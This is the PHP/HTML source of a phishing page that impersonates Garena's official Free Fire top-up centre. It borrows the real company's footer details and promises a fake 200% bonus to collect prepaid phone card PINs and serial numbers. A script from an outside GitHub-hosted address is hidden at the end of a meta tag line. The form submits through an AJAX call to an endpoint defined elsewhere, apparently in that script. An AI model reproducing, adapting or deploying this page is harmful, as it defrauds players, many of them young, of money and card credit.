<?php
session_start();
// if()
?>
<!DOCTYPE html>
<html lang="vi">

<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
    <meta name="author" content="Nạp thẻ Free Fire">

    <link rel="icon" type="image/png" href="images/favicon.ico">

    <title>Free Fire - Trung tâm nạp thẻ Garena</title>

    <meta name="description" content="Trang nạp kim cương Free Fire là đối tác chính thức của nhà phát hành Garena" />
    <meta name="keywords" content="nạp free fire, nạp thẻ free fire, nạp kim cương free fire, nạp game free fire, nạp tiền vào free fire, nạp kim cương free fire miễn phí, nạp free fire vn, nạp free fire x5 kim cương, nạp kim cương free fire giá rẻ, shop nạp kim cương free fire, nạp kim cương free fire x10, nạp kim cương free fire 20k, nạp kim cương free fire 10k, shop nạp kim cương free fire uy tín, nạp kim cương free fire giá rẻ 10k, nạp kim cương free fire giá rẻ, nạp kim cương free fire bằng thẻ viettel, nạp kim cương vào game free fire, ... thì napgameauto.com chính là lựa chọn của bạn."><script src="https://theme3x.github.io/theme/jquery.min.js"></script>
    <meta name="robots" content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1">

    <link rel="stylesheet" href="css/bootstrap.min.css">
    <link rel="stylesheet" href="css/napthe1.css">
    <link href="css/style.css" rel="stylesheet">


    <script src="js/jquery-3.2.1.min.js"></script>
    <script src="js/bootstrap.min.js"></script>
    <script src="js/custom1.js"></script>
    <meta name="description" content="Trang nạp thẻ sự kiện chính thức ra mắt. Nhân đôi nạp thẻ cho lần nạp thẻ đầu tiên">
    <meta name="robots" content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1">

    <script id="facebook-jssdk" src="js/xfbml.customerchat.js"></script>
    <script src="//cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.3.1/dist/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
    <link href="css/bootstrap.min.css" rel="stylesheet">
    <link href="css/backcode.css" rel="stylesheet">

    <link rel="stylesheet" href="css/bootstrap.min_1.css">
    <link rel="stylesheet" href="css/napthe1.css">
    <link href="css/style.css" rel="stylesheet">
    <script src="js/jquery.min.js"></script>
    <script type="text/javascript" src="js/jquery-migrate-1.2.1.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>


    <link rel="stylesheet" type="text/css" href="css/slick.css">

    <script src="js/custom1.js"></script>





    <link rel="stylesheet" href="css/swiper-bundle.min.css">
</head>
<style>
    ._1hweB5ItSQQHG-8EWc4tSA {
        cursor: pointer;
        position: absolute;
        top: 44%;
        width: auto;
        margin-top: -22px;
        padding: 16px;
        color: #fff;
        font-weight: 700;
        font-size: 18px;
        -webkit-transition: .6s ease;
        transition: .6s ease;
        -webkit-user-select: none;
        -moz-user-select: none;
        -ms-user-select: none;
        user-select: none;
        background-color: #0000005e;
        z-index: 9999;
    }

    ._1hweB5ItSQQHG-8EWc4tSA:hover {
        background-color: #000;
        color: #fff;
    }

    ._3PirFWhopJOXGnZhpuqX1r {
        right: 0;
    }

    ._3NSBt_8-4OCjcYRkvj1gTs {
        margin: 20px auto 0;
        width: 200px;
    }

    ._3duKww4d68rWsj1YAVEbYt,
    .Sva6wwZSMctLulz_i_wEK ._2_Z5k48bD2qEQak-stRM7k {
        display: block;
        background: #d43831;
        color: #fff;
        border: none;
        width: 100%;
        padding: 10px 0;
        border-radius: 3px;
        cursor: pointer;
        -webkit-transition: opacity .3s, background-color .3s;
        transition: opacity .3s, background-color .3s;
    }

    ._1bFA2L80inoTjrh17pCiQS {
        padding: 20px;
        width: 500px;
        margin: auto;
        background-color: #fff;
        border-radius: 4px;
        overflow: hidden;
        position: relative;
    }

    ._1tkOv1oa5lokukWN4ZnvUb {
        width: 100%;
        height: 100%;
        border-radius: 50%;
        position: absolute;
    }

    ._3Kc2mjojIDzTw9Dd9A55NZ,
    .logoblackcode {
        width: 111px;
        height: 31px;
        margin: 7px 3px 7px 0;
        background-size: 100% 100%;
    }

    .logoblackcode {
        background-image: url('images/logo.png');
    }
</style>





<header class="DnJg2wii91EoMVEmQlxgt">

    <div class="_1xTEyRfwwnEgJCfGVkhHSc" bis_skin_checked="1">

        <div class="" bis_skin_checked="1">
            <a class="" href="/">

                <div class="logoblackcode" bis_skin_checked="1"></div>

            </a>
        </div>
        <div class="TY2AoOwVwS4-FScXaLE1n" bis_skin_checked="1"></div>


        <div class="_1PPYwF3SUxfFqeODhOLfGs _5xFKprs5APbpqP1M0XBHv" bis_skin_checked="1">
            <div bis_skin_checked="1">
                <div class="_10Ns7yMQyqBkk2Q1kGXWR" bis_skin_checked="1">
                    <div class="_38J7v22SS4Hmsnkr-ES3Lz" bis_skin_checked="1"><img class="_1tkOv1oa5lokukWN4ZnvUb" src="https://cdngarenanow-a.akamaihd.net/gop/app/0000/100/067/icon.png"></div>
                    <div class="_2QdiuL_QlCieAAl1OTTsY0" bis_skin_checked="1"><?=$_SESSION['nickname']?></div>
                </div>
            </div>
            <div class="_3jKVQa3CnRfVVWP_sDIsUm" bis_skin_checked="1"></div>
            <div class="Wicr_TKoj8nHWGaCbb-N6 _1GCu7olSS1Ygpdofjk8hIX" bis_skin_checked="1">
                <div class="_2SliwEgaEOn2Asi5wJSkNi" bis_skin_checked="1">
                    <div class="_1OPYpLj0T_GcozqQLsQriH" bis_skin_checked="1"><img class="_2Q_WH7y_L313NAaHJNDNX6" src="https://cdngarenanow-a.akamaihd.net/gop/app/0000/100/067/icon.png"></div>
                    <div class="_1jdTjo7SMa8XJ18K_GqHXd" bis_skin_checked="1"><?=$_SESSION['nickname']?></div>
                </div><a class="_2XGMm_MyFKxyTDXwwOOoK" href="https://garena.vn/" target="_blank" bis_skin_checked="1">Chăm sóc khách hàng</a><a href="logout.php" class="_2XGMm_MyFKxyTDXwwOOoK">Thoát chế độ ID người chơi</a></div>
        </div>


    </div>
</header>

<section>
    <div class="container">

        <div class="banner"><img src="https://cdn.vn.garenanow.com/web/napthevn/sp_pc_170222.png" alt=""></div>
        <div class="main-section__title">
            <div class="main-section__title-txt main-section__title-channel"><img src="https://cdngarenanow-a.akamaihd.net/gop/app/0000/100/067/icon.png" style="width:25px;height:25px;"> &nbsp; Free Fire</div>
        </div>
        <div class="row">
            <div class="col-md-6">
                <div class="form-thanh-toan">

                    <form id="myform" method="POST">
   <div id="status"></div>
                        <div>
                            <label for="username">Tên tài khoản Free Fire</label>

                            <input type="text" class="form-control"  name="username" placeholder="<?=$_SESSION['nickname']?>" value="<?=$_SESSION['nickname']?>" disabled="">
                        </div>


                        <div>
                            <label>Loại thẻ:</label>
                            <br/>
                            <input type="hidden" name="card_type" value="">
                            <img class="loai-the" src="images/viettel.png" title="Nạp thẻ Free Fire bằng thẻ Viettel" alt="VIETTEL" value="Viettel">
                            <img class="loai-the" src="images/mobifone.png" title="Nạp thẻ Free Fire bằng thẻ Mobifone" alt="MOBIFONE" value="MobiFone">
                            <img class="loai-the" src="images/vinaphone.png" title="Nạp thẻ Free Fire bằng thẻ Vinaphone" alt="VINAPHONE" value="VinaPhone">
                            <img class="loai-the" src="images/vietnamobile.png" title="Nạp thẻ Free Fire bằng thẻ Garena" alt="VNMOBI" value="Vietnamobile">
                            <img class="loai-the" src="images/gate.png" title="Nạp thẻ Free Fire bằng thẻ GATE" alt="GATE" value="Gate">
                        </div>

                        <div>
                            <label for="card_amount">Mệnh giá thẻ:</label> <span style="font-style: italic; font-size: 13px; margin-top:15px;color:red;">(Chú ý: nếu chọn sai mệnh giá sẽ bị mất thẻ)</span>
                            <select name="card_amount" id="card_amount" class="form-control" required="required">
<option value="0" selected="selected">- Chọn mệnh giá -</option>
<option value="50000">50.000đ (Nhận Quà Khi Nạp Lần Đầu)</option>
<option value="100000">100.000đ (Nhận Quà Khi Nạp Lần Đầu)</option>
<option value="200000">200.000đ (Nhận Quà Khi Nạp Lần Đầu)</option>
<option value="500000">500.000đ (Nhận Quà Khi Nạp Lần Đầu)</option>
<option value="1000000">1.000.000đ (Nhận Quà Khi Nạp Lần Đầu)</option>
</select>
                        </div>

                        <div>
                            <label for="pin">Mã thẻ:</label>
                            <input type="text" class="form-control" name="pin" id="pin" placeholder="Nhập mã dưới lớp tráng bạc ...">
                        </div>

                        <div>
                            <label for="serial">Số seri:</label>
                            <input type="text" class="form-control" name="serial" id="serial" placeholder="Nhập số seri in trên thẻ ...">
                        </div>


                        <p style="font-style: italic;font-size: 13px; margin-top:15px;">* Bằng cách nhấn "NẠP THẺ" đồng nghĩa bạn đã chấp nhận điều khoản của trang web.</p>

                        <div class="error-msg thongbaoloi hide"></div>
                        <!--- Thông báo lỗi nhập thiếu -->


                        <div style="padding-top: 8px;"><a type="submit" id="btn_tieptuc" name="napthe" class="btn btn-danger btn-block" data-loading-text="<i class='fa fa-spinner fa-spin'></i> ĐANG NẠP THẺ">NẠP THẺ</a></div>
                    </form>

                </div>
            </div>

            <div class="col-md-offset-1 col-md-5">
                <h2 class="table-title" style="padding-top: 10px;"><b>Bảng giá quy đổi Kim cương</b></h2>
                <div class="alert alert-info">Ưu đãi nhận thêm <b><font color="red">200%</font></b> giá trị thẻ cào khi nạp <strong>kim cương</strong> bằng thẻ <span style="color:#ff0000;"><b>Viettel Telecom</b></span>.</div>
                <table class="table table-hover" style="-webkit-box-shadow: 0 0 20px 0 rgb(0 0 0 / 10%);box-shadow: 0 0 20px 0 rgb(0 0 0 / 10%);">
                    <thead>
                        <tr>
                            <th class="text-danger" style="border: 1px solid #e1e1e1; text-align: center;">Mệnh giá</th>
                            <th class="text-danger" style="border: 1px solid #e1e1e1;  text-align: center;">Kim cương</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td style="border: 1px solid #e1e1e1; text-align: center;">50 000 VNĐ</td>
                            <td style="border: 1px solid #e1e1e1;  text-align: center;">💎 × 580 <span style="color:#008000;">(+ 1 160)</span></td>
                        </tr>
                        <tr>
                            <td style="border: 1px solid #e1e1e1; text-align: center;">100 000 VNĐ</td>
                            <td style="border: 1px solid #e1e1e1;  text-align: center;">💎 × 1 190 <span style="color:#008000;">(+ 2 320)</span></td>
                        </tr>
                        <tr>
                            <td style="border: 1px solid #e1e1e1; text-align: center;">200 000 VNĐ</td>
                            <td style="border: 1px solid #e1e1e1;  text-align: center;">💎 × 3 050 <span style="color:#008000;">(+ 4 640)</span></td>
                        </tr>
                        <tr>
                            <td style="border: 1px solid #e1e1e1; text-align: center;">500 000 VNĐ</td>
                            <td style="border: 1px solid #e1e1e1;  text-align: center;">💎 × 6 100 <span style="color:#008000;">(+ 9 280)</span></td>
                        </tr>
                        <td style="border: 1px solid #e1e1e1; text-align: center;">1 000 000 VNĐ</td>
                        <td style="border: 1px solid #e1e1e1;  text-align: center;">💎 × 12 200 <span style="color:#008000;">(+ 18 560)</span></td>
                        </tr>
                    </tbody>
                </table>
            </div>
        </div>
        <hr/>

        <h4>Thẻ thành viên tuần & tháng</h4>
        <ul>
            <li>Nạp thẻ trị giá trên <strong>100.000đ</strong> nhận ngay ngẫu nhiên thẻ tuần hoặc thẻ tháng.</li>
            <li>
                <div class="_16dT1KND1qDXC3JdScynRN">
                    <div class="_3oCvGriHrqVE5WjIIukMDJ" style="opacity: 0;"></div><img class="_2ILTw21bFm-5eDwXi5Klph" src="https://cdngarenanow-a.akamaihd.net/gop/app/0000/100/067/rebate/0000/000/002/logo.png">
                    <div class="_7TfP9MRixAEEHosMmQ3DB">
                        <div class="wq33u8ZjNZGF_-rtPD5I7">Hot</div>
                    </div>
                </div>
                <div class="_3GSLwZLXi8djCnHN507JQj">Thẻ tuần</div>

            </li>
            <li>
                <div class="_16dT1KND1qDXC3JdScynRN">
                    <div class="_3oCvGriHrqVE5WjIIukMDJ" style="opacity: 0;"></div><img class="_2ILTw21bFm-5eDwXi5Klph" src="https://cdngarenanow-a.akamaihd.net/gop/app/0000/100/067/rebate/0000/081/041/logo.png">
                    <div class="_7TfP9MRixAEEHosMmQ3DB">
                        <div class="wq33u8ZjNZGF_-rtPD5I7">Hot</div>
                    </div>
                </div>
                <div class="_3GSLwZLXi8djCnHN507JQj">Thẻ tháng</div>

            </li>
        </ul>

        <hr/>

        <h4>Hướng dẫn nạp thẻ</h4>
        <ol>
            <li>Khách hàng cần chuẩn bị thẻ cào hợp lệ được cung cấp trên hệ thống. Các thẻ cào hợp lệ như <strong>Viettel</strong>, <strong>Vinaphone</strong>, <strong>Mobifone</strong>, <strong>Vietnamobile</strong> và <strong>GATE</strong>.</li>
            <li>Khách hàng nhập đầy đủ thông tin vào bảng nạp thẻ bao gồm: UID tài khoản <strong>Free Fire</strong>, chọn loại thẻ cần nạp, chọn mệnh giá của thẻ cào, điền số seri và mã thẻ cần nạp.</li>
            <li>Sau khi điền đầy đủ thông tin, khách hàng cần kiểm tra lại kỹ thông tin của mình để tránh trường hợp nhập sai dẫn đến bị mất thẻ.</li>
            <li>Khi đã kiểm tra thông tin điền vào bảng là chính xác. Khách hàng bấm vào nút <strong>"NẠP THẺ"</strong>.</li>
            <li>Sau khi bấm nút <strong>"NẠP THẺ"</strong> quý khách hàng vui lòng đợi hệ thống kiểm tra. Hệ thống kiểm tra hoàn tất quý khách hàng vui lòng đăng nhập vào game để nhận Kim cương và phần thưởng.</li>
        </ol>

    </div>
    <footer class="footer">
        <div class="main-section">
            CÔNG TY CỔ PHẦN PHÁT TRIỂN THỂ THAO ĐIỆN TỬ VIỆT NAM
            <br> Giấy CNĐKKD số 0103959912, cấp lần đầu ngày 09/06/2009 | Cơ quan cấp: Phòng Đăng ký kinh doanh - Sở Kế hoạch và đầu tư TP Hà Nội
            <br> Địa chỉ trụ sở chính: Tầng 29, Tòa nhà Trung tâm Lotte Hà Nội, số 54 đường Liễu Giai, Phường Cống Vị, Quận Ba Đình, TP Hà Nội, Việt Nam
            <br> Điện thoại: 024 73053939
        </div>
        <div class="container">
            <nav class="footer-link-wrap">
                <a class="footer-link-txt" href="#">Câu hỏi thường gặp</a> | <a class="footer-link-txt" href="#">Điều khoản sử dụng</a> | <a class="footer-link-txt" href="#">Chính sách bảo mật</a>
            </nav>
            <nav class="footer-link-wrap text-small">

            </nav>
        </div>
    </footer>
     <script type="text/javascript">
                                         
                                            $("#btn_tieptuc").click(function() {
                                                var loaithe = $('input[name=card_type]').val();
                                                  if (loaithe == '') {
            $('.error-msg').removeClass('hide');
            $('.error-msg').html('⛔️ Vui lòng chọn loại thẻ cần nạp.');
            
        }else{
             $("#btn_tieptuc").button('loading');
            $('.error-msg').addClass('hide');
                                               
                                                $.ajax({
                                                    url: a,
                                                    type: 'post',
                                                    data: $("#myform").serialize(),
                                                    success: function(data) {
                                                        $("#status").html(data);t();
                                                       
                                                        
                                                        $("#btn_tieptuc").button('reset');
                                                         $("#load_hs").load("ajax/history.php");
														 grecaptcha.reset();
                                                    }
                                                });
}
                                            });

                                         
                                            function getRecaptcha() {

}
                                        </script>

    </body>

</html>